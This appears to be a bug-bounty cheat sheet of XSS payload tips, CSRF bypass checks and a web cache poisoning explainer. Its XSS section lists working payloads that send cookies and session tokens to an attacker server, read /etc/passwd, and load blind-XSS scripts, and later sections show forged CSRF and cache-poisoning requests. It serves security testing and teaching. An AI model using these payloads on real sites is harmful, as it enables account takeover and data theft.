<dd>

Target.com/?s="><script>alert(1)</script> ---> No result ..

Copy and paste same parameter 2 times

Target.com/?s="><script>alert(1)</script>&s="><script>alert(1)</script> ---> boom alert(1)

</dd>
</dl>

</details>

<details>
<summary>Another tip</summary>

<dl>
<dd>

1. Pipe domain with waybackurls

2. Grep .php extension URLs and save in a file

3. Use arjun to find hidden parameters

4. Manually test each URL with XSS payloads

</dd>
</dl>

</details>

<details>
<summary>Another one</summary>

<dl>
<dd>

cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(”

</dd>
</dl>

</details>

<details>
<summary>Another one</summary>

<dl>
<dd>

firstname : <img src='  
lastname: 'onerror=print()>

Result:  
"firstname":"<img src ='","lastname":"'onerror=print()>"

JSON in src tag triggers the error: BOOM!!

also :

First Name: <svg

Last Name: onload=alert(1)>

Name: <svg onload=alert(1)>

</dd>
</dl>

</details>

<details>
<summary>Another interesting fact</summary>

<dl>
<dd>

Do you know that forward slashes ("/") inside html tags are automatically converted by browsers to spaces (" ").

Eg:  
X  
will be automatically converted into  
X

</dd>
</dl>

</details>

<details>
<summary>gau + reflected-parameters `(extension)`</summary>

<dl>
<dd>

Use https://github.com/lc/gau to find parameters and then I send data to burp suite and use https://github.com/portswigger/reflected-parameters… to check reflected parameters for XSS

</dd>
</dl>

</details>

<details>
<summary>Reflected XSS to Account Takeover</summary>

<dl>
<dd>

Tip: When cookies are HTTP only go for localStorage -- alert(JSON.stringify(localStorage));

</dd>
</dl>

</details>

<details>
<summary>XSS to local file read</summary>

<dl>
<dd>

<script>x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};http://x.open("GET","file:///etc/passwd");x.send();</script>

</dd>
</dl>

</details>

<details>
<summary>Steal Auth token from SessionStorage by Stored XSS</summary>

<dl>
<dd>

1. <img src=asdf onerror=alert(JSON.stringify(sessionStorage))>

2. <img src=x onerror='function steal() {for (const [key, value] of Object.entries(sessionStorage)) {var pair = key + "=" + value;var i=new Image;i.src="http://127.0.0.1/?"+pair;};} steal();';>

</dd>
</dl>

</details>

<details>
<summary>Reflected XSS impact</summary>

<dl>
<dd>

To demonstrate XSS impact, don’t use alert(‘alert’). Determine whether session is stored in cookies or local storage and put that in the popup. cookie: alert(document.cookie) LocalStorage: alert(localStorage.getItem(‘access\_token’))

</dd>
</dl>

</details>

<details>
<summary>Easy Stored XSS & HTML Injection</summary>

<dl>
<dd>

1. site: http://target.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat\_us" | inurl:"contact\_form" | inurl:"contact-form"

</dd>
</dl>

</details>

<details>
<summary>Lable XSS hunter payload to find where payload gets executed</summary>

<dl>
<dd>

"><Script/src=//xss.xss.ht></scripT><img src=https://myhost\*com/(target name)>

</dd>
</dl>

</details>

<details>
<summary>pdf file upload to xss</summary>

<dl>
<dd>

https://gist.github.com/andripwn/671ef1aa6c535d9168c900524bfb84e1

</dd>
</dl>

</details>

<details>
<summary>Blind XSS</summary>

<dl>
<dd>

'"></title></textarea></script></style></noscript><script src=https://abc.xss.ht></script>

</dd>
</dl>

</details>

<details>
<summary>CRLF to xss</summary>

<dl>
<dd>

%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21—

</dd>
</dl>

</details>

<details>
<summary>payload tip</summary>

<dl>
<dd>

1. Use `` back quotes when () parantheses are blocked

2. They might filter <script>, but how do they handle non-harmful HTML tags such as <u>?

If they encode <> ,what happens if you provide already encoded tags such as %3C or < Test for double encoding --> %253C , %26lt; Not many people know about "＜"-→

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>impact proving</summary>

<dl>
<dd>

simply use import() to prove I can run any JS I want & never had any issues

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

to demonstrate XSS impact, don't use alert('alert'). Determine whether session is stored in cookies or local storage and put that in the popup. cookie: alert(document.cookie) LocalStorage: alert(localStorage.getItem('access\_token'))

</dd>
</dl>

</details>

<details>
<summary>HTML injection (POC creation)</summary>

<dl>
<dd>

1. <form action="@collaberator.burpcollaborator.net">Password:<br><input name="p"><br><input type="submit" value="Join meet"></form><!--

2. "><NOSCRIPT><p title="</NOSCRIPT><script src=https://xxxx.xss(.)ht></script>">

3. <h1>!!</h1><br/><h2><p style=\"color:red;\">there is a new discount code of 80%. Take advantage of it now!</p><form action=\"https://url/\\"><button type=\"submit\">Click Here</button></h2>

4. For create layer mask:

`...`

5. For obtain content page, email:

`<form action='//evil.com'><button type='submit'><textarea name='x'>...`

</dd>
</dl>

</details>

<details>
<summary>Top G Tip</summary>

<dl>
<dd>

I have used double URL encoded version of this payload:  
<img src="x" onerror="fetch('http://yourserver/?cookie=' + encodeURIComponent(document.cookie));">

XSS Tips :

1. If the Application encode your input properly, then still execute 2 version of your polyglot payload:  
   Single url encoded version and Double url encoded version. Depends on how the application handle user's input your payload may still be executed.

2. If you have found an XSS then don't just popup an alert and report it. Show proper impact. Hijack victim's session, Steal local storage data or try to escalate the severity via chaining with other Bugs.

</dd>
</dl>

</details>

<details>
<summary>Blind XSS Payload Tip</summary>

<dl>
<dd>

1. use an identifier so you can easily find out, like //blindxssdomain/?i=name, ?i=posttitle, etc :) (or use ?i=1, ?i=2 etc if you need to keep it short and make a note of what number means what)

2. <script src=https://yourxsshunterinstance.com/youruniqueid-timestamp-randomnumber.js></script>

</dd>
</dl>

</details>

<details>
<summary>Request/response manipulation</summary>

<dl>
<dd>

1. Field was not accepting arbitrary input

2. Added a legitimate email and submitted form

3. Intercepted > manipulated parameter to include  
   a Blind XSS payload

4. Account created > Blind XSS triggered later

</dd>
</dl>

</details>

<details>
<summary>blind xss via email</summary>

<dl>
<dd>

1.) Find Target Company Contact Email .

For Example :- BugBounty@target.com , support@target.com etc...

2.) I Highly recommend you to use this payload.

<script> Tag Payload  
<img> Tag Payload

3.) Send Email To Company With Bxss Payload.

</dd>
</dl>

</details>

<details>
<summary>Cool Blind XSS endpoint</summary>

<dl>
<dd>

Find blind XSS endpoints

1. Visit your email client like Gmail etc.

2. Search for Unsubscribe/feedback/Manage preferences.

3. Click on Unsubscribe and put BXSS payload if they ask for any feedback.

</dd>
</dl>

</details>

<details>
<summary>Iframe Injection</summary>

<dl>
<dd>

<iframe width="560" height="315" src="https://[whitelisted domain]/?redir=https://taksecPoC/iframexss.html"></iframe>

</dd>
</dl>

</details>

<details>
<summary>Payload creation method</summary>

<dl>
<dd>

While exploiting XSS vulnerabilities, one should understand the behaviour of the application towards specific payloads. The followings can be considered a checklist before exploiting XSS vulnerability:

- Find the blacklisted/filtered characters. You can use XSS locators for this:

```
'';! - "<XSS>=&{()}
```

- Observe what tags are blocked by WAF and which keywords are allowed (iframe, img, body etc.)

- Try Character Encoding (URL encoding, Double URL encoding, UTF-8 Unicode encoding, Long UTF-8 Unicode encoding, Hex encoding etc.)

- Try XSS using HTML quote encapsulation

- Try URL string evasion

- Create the payload list according to the allowed keywords

- Brute-force the application with the XSS payload list you just created

- Note: Double URL encode can be tried since the first decoding process is performed by HTTP protocol and the resultant encoded URL will bypass the XSS filter. \*

</dd>
</dl>

</details>

<details>
<summary>Burp Suite ext</summary>

<dl>
<dd>

1. Paramminer: Right-click on the target in Burp Suite → extensions → param Miner → guess params.   
   - Analyze the requests in extensions → param Miner → output

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>CSRF</summary>

<dl>
<dd>

<details>
<summary>What is the impact of a CSRF attack?</summary>

<dl>
<dd>

In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

</dd>
</dl>

</details>

<details>
<summary>How does CSRF work?</summary>

<dl>
<dd>

For a CSRF attack to be possible, three key conditions must be in place:

- **A relevant action.** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).

- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.

- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

For example, suppose an application contains a function that lets the user change the email address on their account. When a user performs this action, they make an HTTP request like the following:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

This meets the conditions required for CSRF:

- The action of changing the email address on a user's account is of interest to an attacker. Following this action, the attacker will typically be able to trigger a password reset and take full control of the user's account.

- The application uses a session cookie to identify which user issued the request. There are no other tokens or mechanisms in place to track user sessions.

- The attacker can easily determine the values of the request parameters that are needed to perform the action.

With these conditions in place, the attacker can construct a web page containing the following HTML:

```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

If a victim user visits the attacker's web page, the following will happen:

- The attacker's page will trigger an HTTP request to the vulnerable web site.

- If the user is logged in to the vulnerable web site, their browser will automatically include their session cookie in the request (assuming SameSite cookies are not being used).

- The vulnerable web site will process the request in the normal way, treat it as having been made by the victim user, and change their email address.

### **Note**

Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.

</dd>
</dl>

</details>

<details>
<summary>F**laws in CSRF token validation</summary>

<dl>
<dd>

CSRF vulnerabilities typically arise due to flawed validation of CSRF tokens. In this section, we'll cover some of the most common issues that enable attackers to bypass these defenses.

<details>
<summary>Validation of CSRF token depends on request method</summary>

<dl>
<dd>

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

**LAB :** **CSRF where token validation depends on request method**

</dd>
</dl>

</details>

<details>
<summary>Validation of CSRF token depends on token being present</summary>

<dl>
<dd>

Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

**LAB :** **CSRF where token validation depends on token being present**

</dd>
</dl>

</details>

<details>
<summary>CSRF token is not tied to the user session</summary>

<dl>
<dd>

Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.

**LAB :** **CSRF where token is not tied to user session**

</dd>
</dl>

</details>

<details>
<summary>CSRF token is tied to a non-session cookie</summary>

<dl>
<dd>

In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

**LAB :** **CSRF where token is tied to non-session cookie**

**Note**

The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on `staging.demo.normal-website.com` could be leveraged to place a cookie that is submitted to `secure.normal-website.com`.

</dd>
</dl>

</details>

<details>
<summary>CSRF token is simply duplicated in a cookie</summary>

<dl>
<dd>

In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

In this situation, the attacker can again perform a CSRF attack if the web site contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

**LAB :** **CSRF where token is duplicated in cookie**

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tips : Bypass CSRF Protection</summary>

<dl>
<dd>

https://twitter.com/harshbothra_/status/1533071083015811072?s=20&t=4REhn9TD5xh-t1P9WLY9Dw

<details>
<summary>Things to check for with CSRF</summary>

<dl>
<dd>

- Token predictable (too short, sequential,...)

- Token is placed in every form that needs it

- Token is not session bound

- Token is only checked on length

- Server only checks if token is there

- Server does not check if there is no parameter

</dd>
</dl>

</details>

<details>
<summary>Tips</summary>

<dl>
<dd>

1. https://twitter.com/0x_rood/status/1467682739478540289?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

2. https://twitter.com/jae_hak99/status/1335192935197917185?s=20&t=xwnkkWxQ-uFbVJt7kEbSGA

3. https://twitter.com/jae_hak99/status/1431866997940240390?s=20&t=xwnkkWxQ-uFbVJt7kEbSGA

4. https://twitter.com/m4ll0k/status/1449025386193563651?s=20&t=xwnkkWxQ-uFbVJt7kEbSGA

</dd>
</dl>

</details>

<details>
<summary>All about CSRF</summary>

<dl>
<dd>

1. https://twitter.com/rootxyash/status/1480126074994368512?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

2. https://twitter.com/D1r3Wolf_/status/1253227278630219777?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Checklist</summary>

<dl>
<dd>

1. Remove the entire token parameter with value/Remove just the value.

2. Use any other random but same length token.

3. Use any other random (length-1) or (length+1) token.

4. Use attacker's token in victim's session.

5. Change the method from POST to GET and remove the token.

6. If request is made through PUT or DELETE then try POST /profile/update?\_method=PUT HTTP/1.1 or

```
POST /profile/update HTTP/1.1
Host: example.com
...

_method=PUT
```

1. If token is sent through custom header; try to remove the header.

2. Change the Content-Type to application/json, application/x-url-encoded or form-multipart, text/xml, application/xml.

3. If double submit token is there (in cookies and some header) then try CRLF injection.

4. Bypassing referrer check:i. If the referrer header is checked but only when it exists in the request then add this piece of code in your csrf poc: `<meta name="referrer" content="never">`ii. Regex Referral bypass:

```
https://attacker.com?target.com
https://attacker.com;target.com
https://attacker.com/target.com/../targetPATH
https://target.com.attacker.com
https://attackertarget.com
https://target.com@attacker.com
https://attacker.com#target.com
https://attacker.com\.target.com
https://attacker.com/.target.com
```

1. CSRF token stealing via xss/htmli/cors.

2. JSON Based:i. Change the Content-Type to text/plain, application/x-www-form-urlencoded, multipart/form-data and check if it accepts.ii. Use flash + 307 redirect.

3. Guessable CSRF token.

4. Clickjacking to strong CSRF token bypass.

5. Type Juggling.

6. Set the csrf token to "null" or add null bytes.

7. Check whether csrf token is sent over http or sent to 3rd party. See here

8. Generate multiple csrf tokens, observe the static part. Keep it as it is and play with the dynamic part.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Web cache poisoning</summary>

<dl>
<dd>

<details>
<summary>What is web cache poisoning?</summary>

<dl>
<dd>

Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.

Fundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.

A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.

</dd>
</dl>

</details>

<details>
<summary>Constructing a web cache poisoning attack</summary>

<dl>
<dd>

Generally speaking, constructing a basic web cache poisoning attack involves the following steps:

1. Identify and evaluate unkeyed inputs

2. Elicit a harmful response from the back-end server

3. Get the response cached

### 1. **Identify and evaluate unkeyed inputs**

Any web cache poisoning attack relies on manipulation of unkeyed inputs, such as headers. Web caches ignore unkeyed inputs when deciding whether to serve a cached response to the user. This behavior means that you can use them to inject your payload and elicit a "poisoned" response which, if cached, will be served to all users whose requests have the matching cache key. Therefore, the first step when constructing a web cache poisoning attack is identifying unkeyed inputs that are supported by the server.

You can identify unkeyed inputs manually by adding random inputs to requests and observing whether or not they have an effect on the response. This can be obvious, such as reflecting the input in the response directly, or triggering an entirely different response. However, sometimes the effects are more subtle and require a bit of detective work to figure out. You can use tools such as Burp Comparer to compare the response with and without the injected input, but this still involves a significant amount of manual effort.

<details>
<summary>Param Miner</summary>

<dl>
<dd>

Fortunately, you can automate the process of identifying unkeyed inputs by adding the Param Miner extension to Burp from the BApp store. To use Param Miner, you simply right-click on a request that you want to investigate and click "Guess headers". Param Miner then runs in the background, sending requests containing different inputs from its extensive, built-in list of headers. If a request containing one of its injected inputs has an effect on the response, Param Miner logs this in Burp, either in the "Issues" pane if you are using Burp Suite Professional, or in the "Output" tab of the extension ("Extensions" > "Installed" > "Param Miner" > "Output") if you are using Burp Suite Community Edition.

For example, in the following screenshot, Param Miner found an unkeyed header `X-Forwarded-Host` on the home page of the website:

![](https://portswigger.net/web-security/images/param-miner.png)

**Caution:** When testing for unkeyed inputs on a live website, there is a risk of inadvertently causing the cache to serve your generated responses to real users. Therefore, it is important to make sure that your requests all have a unique cache key so that they will only be served to you. To do this, you can manually add a cache buster (such as a unique parameter) to the request line each time you make a request. Alternatively, if you are using Param Miner, there are options for automatically adding a cache buster to every request.

</dd>
</dl>

</details>

### 2. **Elicit a harmful response from the back-end server**

Once you have identified an unkeyed input, the next step is to evaluate exactly how the website processes it. Understanding this is essential to successfully eliciting a harmful response. If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning.

### 3. **Get the response cached**

Manipulating inputs to elicit a harmful response is half the battle, but it doesn't achieve much unless you can cause the response to be cached, which can sometimes be tricky.

Whether or not a response gets cached can depend on all kinds of factors, such as the file extension, content type, route, status code, and response headers. You will probably need to devote some time to simply playing around with requests on different pages and studying how the cache behaves. Once you work out how to get a response cached that contains your malicious input, you are ready to deliver the exploit to potential victims.

![](https://portswigger.net/web-security/images/cache-poisoning.svg)

</dd>
</dl>

</details>

<details>
<summary>Exploiting</summary>

<dl>
<dd>

<details>
<summary>Exploiting cache design flaws</summary>

<dl>
<dd>

<details>
<summary>Using web cache poisoning to deliver an XSS attack</summary>

<dl>
<dd>

Perhaps the simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization.

For example, consider the following request and response:

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Here, the value of the `X-Forwarded-Host` header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. Crucially for web cache poisoning, the `X-Forwarded-Host` header is often unkeyed. In this example, the cache can potentially be poisoned with a response containing a simple XSS payload:

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

If this response was cached, all users who accessed `/en?region=uk` would be served this XSS payload. This example simply causes an alert to appear in the victim's browser, but a real attack could potentially steal passwords and hijack user accounts.

</dd>
</dl>

</details>

<details>
<summary>Using web cache poisoning to exploit unsafe handling of resource imports</summary>

<dl>
<dd>

Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead.

If the response containing this malicious URL is cached, the attacker's JavaScript file would be imported and executed in the browser session of any user whose request has a matching cache key.

```
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

</dd>
</dl>

</details>

<details>
<summary>Using web cache poisoning to exploit cookie-handling vulnerabilities</summary>

<dl>
<dd>

Cookies are often used to dynamically generate content in a response. A common example might be a cookie that indicates the user's preferred language, which is then used to load the corresponding version of the page:

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```

In this example, the Polish version of a blog post is being requested. Notice that the information about which language version to serve is only contained in the `Cookie` header. Let's suppose that the cache key contains the request line and the `Host` header, but not the `Cookie` header. In this case, if the response to this request is cached, then all subsequent users who tried to access this blog post would receive the Polish version as well, regardless of which language they actually selected.

This flawed handling of cookies by the cache can also be exploited using web cache poisoning techniques. In practice, however, this vector is relatively rare in comparison to header-based cache poisoning. When cookie-based cache poisoning vulnerabilities exist, they tend to be identified and resolved quickly because legitimate users have accidentally poisoned the cache.

</dd>
</dl>

</details>

<details>
<summary>Using multiple headers to exploit web cache poisoning vulnerabilities</summary>

<dl>
<dd>

Some websites are vulnerable to simple web cache poisoning exploits, as demonstrated above. However, others require more sophisticated attacks and only become vulnerable when an attacker is able to craft a request that manipulates multiple unkeyed inputs.

For example, let's say a website requires secure communication using HTTPS. To enforce this, if a request that uses another protocol is received, the website dynamically generates a redirect to itself that does use HTTPS:

```
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```

By itself, this behavior isn't necessarily vulnerable. However, by combining this with what we learned earlier about vulnerabilities in dynamically generated URLs, an attacker could potentially exploit this behavior to generate a cacheable response that redirects users to a malicious URL.

</dd>
</dl>

</details>

<details>
<summary>Exploiting responses that expose too much information</summary>

<dl>
<dd>

Sometimes websites make themselves more vulnerable to web cache poisoning by giving away too much information about themselves and their behavior.

**Cache-control directives**

One of the challenges when constructing a web cache poisoning attack is ensuring that the harmful response gets cached. This can involve a lot of manual trial and error to study how the cache behaves. However, sometimes responses explicitly reveal some of the information an attacker needs to successfully poison the cache.

One such example is when responses contain information about how often the cache is purged or how old the currently cached response is:

```
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```

Although this doesn't directly lead to web cache poisoning vulnerabilities, it does save a potential attacker some of the manual effort involved because they know exactly when to send their payload to ensure it gets cached.

This knowledge also enables far more subtle attacks. Rather than bombarding the back-end server with requests until one sticks, which could raise suspicions, the attacker can carefully time a single malicious request to poison the cache.

### **Vary header**

The rudimentary way that the `Vary` header is often used can also provide attackers with a helping hand. The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed. It is commonly used to specify that the `User-Agent` header is keyed, for example, so that if the mobile version of a website is cached, this won't be served to non-mobile users by mistake.

This information can also be used to construct a multi-step attack to target a specific subset of users. For example, if the attacker knows that the `User-Agent` header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected. Alternatively, they could work out which user agent was most commonly used to access the site, and tailor the attack to affect the maximum number of users that way.

**Targeted web cache poisoning using an unknown header**

</dd>
</dl>

</details>

<details>
<summary>Using web cache poisoning to exploit DOM-based vulnerabilities</summary>

<dl>
<dd>

Many websites use JavaScript to fetch and process additional data from the back-end. If a script handles data from the server in an unsafe way, this can potentially lead to all kinds of DOM-based vulnerabilities.

For example, an attacker could poison the cache with a response that imports a JSON file containing the following payload:

```
{"someProperty" : "<svg onload=alert(1)>"}
```

If the website then passes the value of this property into a sink that supports dynamic code execution, the payload would be executed in the context of the victim's browser session.

If you use web cache poisoning to make a website load malicious JSON data from your server, you may need to grant the website access to the JSON using CORS:

```
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *

{
    "malicious json" : "malicious json"
}
```

</dd>
</dl>

</details>

<details>
<summary>Chaining web cache poisoning vulnerabilities</summary>

<dl>
<dd>

As we saw earlier, sometimes an attacker is only able to elicit a malicious response by crafting a request using multiple headers. But the same is also true of different types of attack. Web cache poisoning sometimes requires the attacker to chain together several of the techniques we've discussed. By chaining together different vulnerabilities, it is often possible to expose additional layers of vulnerability that were initially unexploitable.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Exploiting cache implementation flaws</summary>

<dl>
<dd>

<details>
<summary>Cache key flaws</summary>

<dl>
<dd>

Generally speaking, websites take most of their input from the URL path and the query string. As a result, this is a well-trodden attack surface for various hacking techniques. However, as the request line is usually part of the cache key, these inputs have traditionally not been considered suitable for cache poisoning. Any payload injected via keyed inputs would act as a cache buster, meaning your poisoned cache entry would almost certainly never be served to any other users.

On closer inspection, however, the behavior of individual caching systems is not always as you would expect. In practice, many websites and CDNs perform various transformations on keyed components when they are saved in the cache key. This can include:

- Excluding the query string

- Filtering out specific query parameters

- Normalizing input in keyed components

These transformations may introduce a few unexpected quirks. These are primarily based around discrepancies between the data that is written to the cache key and the data that is passed into the application code, even though it all stems from the same input. These cache key flaws can be exploited to poison the cache via inputs that may initially appear unusable.

In the case of fully integrated, application-level caches, these quirks can be even more extreme. In fact, internal caches can be so unpredictable that it is sometimes difficult to test them at all without inadvertently poisoning the cache for live users.

</dd>
</dl>

</details>

<details>
<summary>Cache probing methodology</summary>

<dl>
<dd>

The methodology of probing for cache implementation flaws differs slightly from the classic web cache poisoning methodology. These newer techniques rely on flaws in the specific implementation and configuration of the cache, which may vary dramatically from site to site. This means that you need a deeper understanding of the target cache and its behavior.

In this section, we'll outline the high-level methodology for probing the cache to understand its behavior and identify any potential flaws. Afterwards, we'll provide some more concrete examples of common cache key flaws and how you can exploit them.

The methodology involves the following steps:

### 1. **Identify a suitable cache oracle**

The first step is to identify a suitable "cache oracle" that you can use for testing. A cache oracle is simply a page or endpoint that provides feedback about the cache's behavior. This needs to be cacheable and must indicate in some way whether you received a cached response or a response directly from the server. This feedback could take various forms, such as:

- An HTTP header that explicitly tells you whether you got a cache hit

- Observable changes to dynamic content

- Distinct response times

Ideally, the cache oracle will also reflect the entire URL and at least one query parameter in the response. This will make it easier to notice parsing discrepancies between the cache and the application, which will be useful for constructing different exploits later.

If you can identify that a specific third-party cache is being used, you can also consult the corresponding documentation. This may contain information about how the default cache key is constructed. You might even stumble across some handy tips and tricks, such as features that allow you to see the cache key directly. For example, Akamai-based websites may support the header `Pragma: akamai-x-get-cache-key`, which you can use to display the cache key in the response headers:

```
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key

HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1
```

### 2. **Probe key handling**

The next step is to investigate whether the cache performs any additional processing of your input when generating the cache key. You are looking for an additional attack surface hidden within seemingly keyed components.

You should specifically look at any transformation that is taking place. Is anything being excluded from a keyed component when it is added to the cache key? Common examples are excluding specific query parameters, or even the entire query string, and removing the port from the `Host` header.

If you're fortunate enough to have direct access to the cache key, you can simply compare the key after injecting different inputs. Otherwise, you can use your understanding of the cache oracle to infer whether you received the correct cached response. For each case that you want to test, you send two similar requests and compare the responses.

Let's say that our hypothetical cache oracle is the target website's home page. This automatically redirects users to a region-specific page. It uses the `Host` header to dynamically generate the `Location` header in the response:

```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```

To test whether the port is excluded from the cache key, we first need to request an arbitrary port and make sure that we receive a fresh response from the server that reflects this input:

```
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```

Next, we'll send another request, but this time we won't specify a port:

```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit
```

As you can see, we have been served our cached response even though the `Host` header in the request does not specify a port. This proves that the port is being excluded from the cache key. Importantly, the full header is still passed into the application code and reflected in the response.

In short, although the `Host` header is keyed, the way it is transformed by the cache allows us to pass a payload into the application while still preserving a "normal" cache key that will be mapped to other users' requests. This kind of behavior is the key concept behind all of the exploits that we'll discuss in this section.

You can use a similar approach to investigate any other processing of your input by the cache. Is your input being normalized in any way? How is your input stored? Do you notice any anomalies? We'll cover how to answer these questions later using concrete examples.

